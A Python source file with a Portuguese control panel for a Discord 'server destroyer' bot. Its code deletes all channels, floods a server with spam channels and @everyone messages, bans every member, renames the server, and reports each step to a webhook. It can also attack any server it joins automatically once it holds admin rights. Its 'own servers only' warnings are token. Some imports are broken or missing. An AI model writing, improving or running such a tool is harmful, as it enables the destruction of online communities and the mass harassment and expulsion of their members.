#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import asyncio
import aiohttp
import discord
from discord import Webhook, AsyncWebhook
from discord.ext import commands
import threading
from typing import Dict, List, Optional
from pathlib import Path

# Interface colorida
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.style import Style
from rich.layout import Layout
from rich.live import Live
from rich.align import Align

console = Console()

class DiscordBotController:
    def __init__(self):
        self.config_file = "bot_config.json"
        self.config = self._carregar_config()
        self.bot = None
        self.running = False
        self.attack_status = "Parado"
        
    def _carregar_config(self) -> Dict:
        """Carrega configuração do arquivo"""
        default_config = {
            "token": "",
            "prefix": "!",
            "webhook_url": "",
            "auto_attack": False,
            "delete_channels": True,
            "create_channels": True,
            "ban_all_members": True,
            "spam_messages": True,
            "change_server_info": True,
            "spam_message": "@everyone SERVER DESTROYED BY BOT",
            "channel_names": ["destroyed-by-bot", "get-rekt", "server-nuked"],
            "role_names": ["GET REKT", "NUKED", "DESTROYED"],
            "server_name": "SERVER DESTROYED",
            "max_channels": 50,
            "delay_between_actions": 0.5
        }
        
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    return {**default_config, **json.load(f)}
        except:
            pass
            
        return default_config
    
    def _salvar_config(self):
        """Salva configuração no arquivo"""
        try:
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=4, ensure_ascii=False)
            return True
        except:
            return False
    
    def mostrar_banner(self):
        banner = """
[bold red]
╔═╗┌─┐┌─┐┌─┐  ╔╗ ┌─┐┌─┐┬ ┬  ╔═╗┌─┐┌┬┐┌─┐┬─┐
║  ├─┤├─┘├─┘  ╠╩╗│ ││ │└┬┘  ║ ║├─┘ ││├┤ ├┬┘
╚═╝┴ ┴┴  ┴    ╚═╝└─┘└─┘ ┴   ╚═╝┴  ─┴┘└─┘┴└─
[/bold red]
[bold white on red]         DISCORD SERVER DESTROYER BOT[/bold white on red]
[bold yellow]           PAINEL DE CONTROLE - v2.0[/bold yellow]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]⚠️ USO APENAS PARA SERVIDORES PRÓPRIOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
    
    def menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            # Status do bot
            status_color = "green" if self.running else "red"
            status_text = "[bold green]● ONLINE[/bold green]" if self.running else "[bold red]● OFFLINE[/bold red]"
            
            # Painel de status
            status_panel = Panel(
                f"{status_text}\n"
                f"[cyan]Token:[/cyan] {'✅ Configurado' if self.config['token'] else '❌ Não configurado'}\n"
                f"[cyan]Webhook:[/cyan] {'✅ Configurado' if self.config['webhook_url'] else '❌ Não configurado'}\n"
                f"[cyan]Status Ataque:[/cyan] {self.attack_status}",
                title="[bold]STATUS DO BOT[/bold]",
                border_style=status_color
            )
            
            console.print(status_panel)
            
            # Menu de opções
            tabela = Table(
                title="[bold cyan]🎮 PAINEL DE CONTROLE[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=8)
            tabela.add_column("Comando", style="green")
            tabela.add_column("Descrição", style="white")
            
            opcoes = [
                ("1", "Configurar Bot", "Definir token e configurações"),
                ("2", "Iniciar Bot", "Conectar bot ao Discord"),
                ("3", "Parar Bot", "Desconectar bot"),
                ("4", "Ataque Rápido", "Nuke automático em servidor"),
                ("5", "Configurar Ataque", "Personalizar métodos de destruição"),
                ("6", "Status Detalhado", "Informações do bot e servidores"),
                ("7", "Webhook Manager", "Configurar webhook para logs"),
                ("8", "Testar Conexão", "Testar token e permissões"),
                ("0", "Sair", "Encerrar programa")
            ]
            
            for opcao, comando, descricao in opcoes:
                tabela.add_row(opcao, comando, descricao)
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=[str(i) for i in range(0, 9)],
                show_choices=False
            )
            
            if escolha == "1":
                self.configurar_bot()
            elif escolha == "2":
                self.iniciar_bot()
            elif escolha == "3":
                self.parar_bot()
            elif escolha == "4":
                self.ataque_rapido()
            elif escolha == "5":
                self.configurar_ataque()
            elif escolha == "6":
                self.status_detalhado()
            elif escolha == "7":
                self.webhook_manager()
            elif escolha == "8":
                self.testar_conexao()
            elif escolha == "0":
                self.sair()
    
    def configurar_bot(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]🤖 CONFIGURAÇÃO DO BOT[/bold]",
            border_style="blue"
        ))
        
        # Token do bot
        token_atual = self.config['token']
        if token_atual:
            console.print(f"[cyan]Token atual:[/cyan] {token_atual[:20]}...{token_atual[-10:]}")
            if not Confirm.ask("Alterar token?"):
                novo_token = token_atual
            else:
                novo_token = Prompt.ask("[yellow]?[/yellow] Novo token do bot")
        else:
            novo_token = Prompt.ask("[yellow]?[/yellow] Token do bot Discord")
        
        self.config['token'] = novo_token.strip()
        
        # Prefixo
        self.config['prefix'] = Prompt.ask(
            "[yellow]?[/yellow] Prefixo dos comandos",
            default=self.config['prefix']
        )
        
        # Auto attack
        self.config['auto_attack'] = Confirm.ask(
            "[yellow]?[/yellow] Ataque automático ao obter admin?",
            default=self.config['auto_attack']
        )
        
        if self._salvar_config():
            console.print(Panel.fit(
                "[green]✓ Configurações salvas com sucesso![/green]",
                border_style="green"
            ))
        else:
            console.print(Panel.fit(
                "[red]✗ Erro ao salvar configurações![/red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def configurar_ataque(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]💥 CONFIGURAÇÃO DE ATAQUE[/bold]",
            border_style="red"
        ))
        
        console.print(Panel.fit(
            "[blink bold red]⚠️ CONFIGURAÇÕES PERIGOSAS! ⚠️[/blink bold red]",
            border_style="red"
        ))
        
        # Métodos de destruição
        self.config['delete_channels'] = Confirm.ask(
            "[yellow]?[/yellow] Deletar todos os canais?",
            default=self.config['delete_channels']
        )
        
        self.config['create_channels'] = Confirm.ask(
            "[yellow]?[/yellow] Criar canais de spam?",
            default=self.config['create_channels']
        )
        
        self.config['ban_all_members'] = Confirm.ask(
            "[yellow]?[/yellow] Banir todos os membros?",
            default=self.config['ban_all_members']
        )
        
        self.config['spam_messages'] = Confirm.ask(
            "[yellow]?[/yellow] Enviar mensagens de spam?",
            default=self.config['spam_messages']
        )
        
        self.config['change_server_info'] = Confirm.ask(
            "[yellow]?[/yellow] Alterar informações do servidor?",
            default=self.config['change_server_info']
        )
        
        # Mensagem de spam
        self.config['spam_message'] = Prompt.ask(
            "[yellow]?[/yellow] Mensagem de spam",
            default=self.config['spam_message']
        )
        
        # Nomes de canais
        console.print("\n[cyan]Nomes para canais de spam (separados por vírgula):[/cyan]")
        channel_names = Prompt.ask(
            "[yellow]?[/yellow] Nomes",
            default=",".join(self.config['channel_names'])
        )
        self.config['channel_names'] = [name.strip() for name in channel_names.split(',')]
        
        # Máximo de canais
        self.config['max_channels'] = IntPrompt.ask(
            "[yellow]?[/yellow] Máximo de canais a criar",
            default=self.config['max_channels']
        )
        
        # Delay entre ações
        self.config['delay_between_actions'] = float(Prompt.ask(
            "[yellow]?[/yellow] Delay entre ações (segundos)",
            default=str(self.config['delay_between_actions'])
        ))
        
        if self._salvar_config():
            console.print(Panel.fit(
                "[green]✓ Configurações de ataque salvas![/green]",
                border_style="green"
            ))
        else:
            console.print(Panel.fit(
                "[red]✗ Erro ao salvar configurações![/red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def webhook_manager(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]🌐 WEBHOOK MANAGER[/bold]",
            border_style="blue"
        ))
        
        webhook_atual = self.config['webhook_url']
        if webhook_atual:
            console.print(f"[cyan]Webhook atual:[/cyan] {webhook_atual[:50]}...")
            if not Confirm.ask("Alterar webhook?"):
                return
        
        novo_webhook = Prompt.ask("[yellow]?[/yellow] URL do webhook Discord")
        
        if novo_webhook.strip():
            self.config['webhook_url'] = novo_webhook.strip()
            if self._salvar_config():
                console.print(Panel.fit(
                    "[green]✓ Webhook configurado com sucesso![/green]",
                    border_style="green"
                ))
                
                # Testar webhook
                if Confirm.ask("Testar webhook?"):
                    self._testar_webhook()
            else:
                console.print(Panel.fit(
                    "[red]✗ Erro ao salvar webhook![/red]",
                    border_style="red"
                ))
        
        input("\nPressione Enter para continuar...")
    
    def _testar_webhook(self):
        """Testa o webhook configurado"""
        import requests
        import json
        from datetime import datetime
        
        try:
            data = {
                "content": "",
                "embeds": [{
                    "title": "🔧 Teste de Webhook",
                    "description": "Webhook configurado com sucesso!",
                    "color": 3066993,
                    "timestamp": datetime.now().isoformat(),
                    "footer": {
                        "text": "Discord Destroyer Bot"
                    }
                }]
            }
            
            response = requests.post(self.config['webhook_url'], json=data)
            if response.status_code in [200, 204]:
                console.print("[green]✓ Webhook testado com sucesso![/green]")
            else:
                console.print(f"[red]✗ Erro no webhook: {response.status_code}[/red]")
                
        except Exception as e:
            console.print(f"[red]✗ Erro ao testar webhook: {str(e)}[/red]")
    
    def testar_conexao(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]🔍 TESTE DE CONEXÃO[/bold]",
            border_style="yellow"
        ))
        
        if not self.config['token']:
            console.print("[red]✗ Token não configurado![/red]")
            input("\nPressione Enter para continuar...")
            return
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Testando conexão...[/cyan]", total=100)
            
            try:
                # Criar bot temporário para teste
                intents = discord.Intents.all()
                bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
                
                @bot.event
                async def on_ready():
                    progress.update(task, advance=50)
                    await asyncio.sleep(1)
                    progress.update(task, advance=50)
                    
                    console.print(f"\n[green]✓ Bot conectado como: {bot.user}[/green]")
                    console.print(f"[cyan]ID:[/cyan] {bot.user.id}")
                    console.print(f"[cyan]Servidores:[/cyan] {len(bot.guilds)}")
                    
                    # Listar servidores com permissões
                    tabela = Table(title="[bold]SERVIDORES CONECTADOS[/bold]")
                    tabela.add_column("Nome", style="cyan")
                    tabela.add_column("ID", style="green")
                    tabela.add_column("Permissões", style="yellow")
                    
                    for guild in bot.guilds[:10]:  # Limitar a 10 servidores
                        perms = guild.get_member(bot.user.id).guild_permissions
                        admin = "✅ ADMIN" if perms.administrator else "❌ SEM ADMIN"
                        tabela.add_row(guild.name, str(guild.id), admin)
                    
                    if len(bot.guilds) > 10:
                        tabela.add_row("...", f"+{len(bot.guilds)-10} mais", "...")
                    
                    console.print(tabela)
                    
                    await bot.close()
                
                # Executar teste
                async def run_test():
                    try:
                        await bot.start(self.config['token'])
                    except Exception as e:
                        progress.update(task, completed=100)
                        console.print(f"\n[red]✗ Erro na conexão: {str(e)}[/red]")
                
                asyncio.run(run_test())
                
            except Exception as e:
                console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def iniciar_bot(self):
        if self.running:
            console.print("[yellow]⚠️ Bot já está rodando![/yellow]")
            time.sleep(1)
            return
        
        if not self.config['token']:
            console.print("[red]✗ Token não configurado![/red]")
            time.sleep(1)
            return
        
        console.print(Panel.fit(
            "[bold green]🚀 INICIANDO BOT...[/bold green]",
            border_style="green"
        ))
        
        # Iniciar bot em thread separada
        bot_thread = threading.Thread(target=self._run_bot)
        bot_thread.daemon = True
        bot_thread.start()
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Conectando...[/cyan]", total=100)
            for i in range(100):
                time.sleep(0.03)
                progress.update(task, advance=1)
        
        self.running = True
        console.print(Panel.fit(
            "[green]✓ Bot iniciado com sucesso![/green]",
            border_style="green"
        ))
        time.sleep(2)
    
    def parar_bot(self):
        if not self.running:
            console.print("[yellow]⚠️ Bot não está rodando![/yellow]")
            time.sleep(1)
            return
        
        console.print(Panel.fit(
            "[bold red]🛑 PARANDO BOT...[/bold red]",
            border_style="red"
        ))
        
        if self.bot:
            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)
        
        self.running = False
        self.attack_status = "Parado"
        
        console.print(Panel.fit(
            "[green]✓ Bot parado com sucesso![/green]",
            border_style="green"
        ))
        time.sleep(2)
    
    def ataque_rapido(self):
        if not self.running:
            console.print("[red]✗ Bot não está conectado![/red]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold red]💥 ATAQUE RÁPIDO[/bold red]",
            border_style="red"
        ))
        
        console.print(Panel.fit(
            "[blink bold red]☠️ ISSO IRÁ DESTRUIR UM SERVIDOR! ☠️[/blink bold red]",
            border_style="red"
        ))
        
        server_id = Prompt.ask("[yellow]?[/yellow] ID do servidor alvo")
        
        if not Confirm.ask("[red]CONFIRMAR DESTRUIÇÃO DO SERVIDOR?[/red]"):
            return
        
        # Enviar comando de ataque para o bot
        if self.bot:
            asyncio.run_coroutine_threadsafe(
                self._executar_ataque(server_id), 
                self.bot.loop
            )
            
            console.print(Panel.fit(
                "[yellow]⚡ Comando de ataque enviado![/yellow]",
                border_style="yellow"
            ))
            self.attack_status = f"Atacando servidor {server_id}"
        
        input("\nPressione Enter para continuar...")
    
    def status_detalhado(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]📊 STATUS DETALHADO[/bold]",
            border_style="cyan"
        ))
        
        if not self.running or not self.bot:
            console.print("[red]Bot não está conectado[/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Coletar informações de forma assíncrona
        async def get_info():
            info = {
                "user": str(self.bot.user),
                "id": self.bot.user.id,
                "servers": len(self.bot.guilds),
                "latency": round(self.bot.latency * 1000, 2),
                "admin_servers": 0,
                "servers_list": []
            }
            
            for guild in self.bot.guilds:
                perms = guild.get_member(self.bot.user.id).guild_permissions
                has_admin = perms.administrator
                if has_admin:
                    info["admin_servers"] += 1
                
                info["servers_list"].append({
                    "name": guild.name,
                    "id": guild.id,
                    "members": guild.member_count,
                    "admin": has_admin
                })
            
            return info
        
        # Executar e aguardar resultado
        try:
            future = asyncio.run_coroutine_threadsafe(get_info(), self.bot.loop)
            info = future.result(timeout=10)
            
            # Exibir informações
            console.print(f"[cyan]Bot:[/cyan] {info['user']} (ID: {info['id']})")
            console.print(f"[cyan]Ping:[/cyan] {info['latency']}ms")
            console.print(f"[cyan]Servidores:[/cyan] {info['servers']} total, {info['admin_servers']} com admin")
            
            # Tabela de servidores
            if info['servers_list']:
                tabela = Table(title="[bold]SERVIDORES[/bold]")
                tabela.add_column("Nome", style="cyan")
                tabela.add_column("ID", style="green")
                tabela.add_column("Membros", style="yellow")
                tabela.add_column("Admin", style="red")
                
                for server in info['servers_list'][:15]:  # Limitar a 15
                    admin_status = "✅" if server['admin'] else "❌"
                    tabela.add_row(
                        server['name'][:30],
                        str(server['id']),
                        str(server['members']),
                        admin_status
                    )
                
                if len(info['servers_list']) > 15:
                    tabela.add_row("...", f"+{len(info['servers_list'])-15} mais", "...", "...")
                
                console.print(tabela)
            
        except Exception as e:
            console.print(f"[red]Erro ao obter status: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def _run_bot(self):
        """Executa o bot Discord"""
        intents = discord.Intents.all()
        self.bot = commands.Bot(
            command_prefix=self.config['prefix'],
            intents=intents,
            help_command=None
        )
        
        @self.bot.event
        async def on_ready():
            console.print(f"\n[green]✓ Bot conectado como {self.bot.user}[/green]")
            await self._enviar_log_webhook(f"Bot iniciado: {self.bot.user}")
        
        @self.bot.event
        async def on_guild_join(guild):
            console.print(f"[yellow]➕ Entrou no servidor: {guild.name}[/yellow]")
            await self._enviar_log_webhook(f"Entrou no servidor: {guild.name} (ID: {guild.id})")
            
            # Auto attack se configurado
            if self.config['auto_attack']:
                perms = guild.get_member(self.bot.user.id).guild_permissions
                if perms.administrator:
                    console.print(f"[red]⚡ Auto-ataque em: {guild.name}[/red]")
                    await self._executar_ataque(guild.id)
        
        @self.bot.command(name='nuke')
        async def nuke(ctx, server_id: str = None):
            """Comando de destruição de servidor"""
            if not server_id:
                server_id = ctx.guild.id
            
            if ctx.author.id != self.bot.user.id:  # Apenas o próprio bot pode executar
                return
            
            console.print(f"[red]🎯 Comando nuke recebido para servidor: {server_id}[/red]")
            await self._executar_ataque(server_id)
        
        # Iniciar bot
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            console.print(f"[red]✗ Erro no bot: {str(e)}[/red]")
            self.running = False
    
    async def _executar_ataque(self, server_id: str):
        """Executa o ataque no servidor"""
        try:
            guild = self.bot.get_guild(int(server_id))
            if not guild:
                console.print(f"[red]✗ Servidor {server_id} não encontrado[/red]")
                return
            
            self.attack_status = f"Atacando {guild.name}"
            console.print(f"[red]💥 INICIANDO ATAQUE EM: {guild.name}[/red]")
            
            await self._enviar_log_webhook(f"🚨 INICIANDO ATAQUE EM: {guild.name}")
            
            # Verificar permissões
            perms = guild.get_member(self.bot.user.id).guild_permissions
            if not perms.administrator:
                console.print(f"[red]✗ Sem permissões de admin em {guild.name}[/red]")
                return
            
            # Executar métodos de destruição
            if self.config['delete_channels']:
                await self._deletar_canais(guild)
            
            if self.config['create_channels']:
                await self._criar_canais_spam(guild)
            
            if self.config['ban_all_members']:
                await self._banir_membros(guild)
            
            if self.config['change_server_info']:
                await self._alterar_servidor(guild)
            
            if self.config['spam_messages']:
                await self._enviar_spam(guild)
            
            console.print(f"[green]✓ Ataque concluído em {guild.name}[/green]")
            await self._enviar_log_webhook(f"✅ ATAQUE CONCLUÍDO: {guild.name}")
            self.attack_status = "Ataque concluído"
            
        except Exception as e:
            console.print(f"[red]✗ Erro no ataque: {str(e)}[/red]")
            await self._enviar_log_webhook(f"❌ ERRO NO ATAQUE: {str(e)}")
    
    async def _deletar_canais(self, guild):
        """Deleta todos os canais do servidor"""
        try:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    console.print(f"[red]🗑️ Deletado canal: {channel.name}[/red]")
                    await asyncio.sleep(self.config['delay_between_actions'])
                except:
                    continue
        except Exception as e:
            console.print(f"[yellow]⚠️ Erro ao deletar canais: {str(e)}[/yellow]")
    
    async def _criar_canais_spam(self, guild):
        """Cria canais de spam"""
        try:
            for i in range(min(self.config['max_channels'], 50)):
                name = random.choice(self.config['channel_names']) + str(i)
                try:
                    await guild.create_text_channel(name)
                    console.print(f"[red]📝 Criado canal: {name}[/red]")
                    await asyncio.sleep(self.config['delay_between_actions'])
                except:
                    continue
        except Exception as e:
            console.print(f"[yellow]⚠️ Erro ao criar canais: {str(e)}[/yellow]")
    
    async def _banir_membros(self, guild):
        """Bane todos os membros do servidor"""
        try:
            for member in guild.members:
                if member != self.bot.user and not member.bot:
                    try:
                        await member.ban(delete_message_days=7)
                        console.print(f"[red]🔨 Banido: {member}[/red]")
                        await asyncio.sleep(self.config['delay_between_actions'])
                    except:
                        continue
        except Exception as e:
            console.print(f"[yellow]⚠️ Erro ao banir membros: {str(e)}[/yellow]")
    
    async def _alterar_servidor(self, guild):
        """Altera informações do servidor"""
        try:
            await guild.edit(
                name=self.config['server_name'],
                description="DESTROYED BY BOT"
            )
            console.print(f"[red]⚡ Servidor renomeado para: {self.config['server_name']}[/red]")
        except Exception as e:
            console.print(f"[yellow]⚠️ Erro ao alterar servidor: {str(e)}[/yellow]")
    
    async def _enviar_spam(self, guild):
        """Envia mensagens de spam"""
        try:
            for channel in guild.text_channels:
                try:
                    for _ in range(3):  # 3 mensagens por canal
                        await channel.send(self.config['spam_message'])
                        await asyncio.sleep(0.5)
                    console.print(f"[red]💬 Spam em: {channel.name}[/red]")
                except:
                    continue
        except Exception as e:
            console.print(f"[yellow]⚠️ Erro no spam: {str(e)}[/yellow]")
    
    async def _enviar_log_webhook(self, message: str):
        """Envia log para webhook"""
        if not self.config['webhook_url']:
            return
        
        try:
            import requests
            from datetime import datetime
            
            data = {
                "content": message,
                "username": "Destroyer Bot Logs",
                "embeds": [{
                    "title": "🔧 Log do Bot",
                    "description": message,
                    "color": 15105570,
                    "timestamp": datetime.now().isoformat(),
                    "footer": {
                        "text": "Discord Destroyer Bot"
                    }
                }]
            }
            
            requests.post(self.config['webhook_url'], json=data, timeout=10)
            
        except:
            pass  # Silenciar erros de webhook
    
    def sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        
        if self.running:
            self.parar_bot()
        
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        controller = DiscordBotController()
        controller.menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
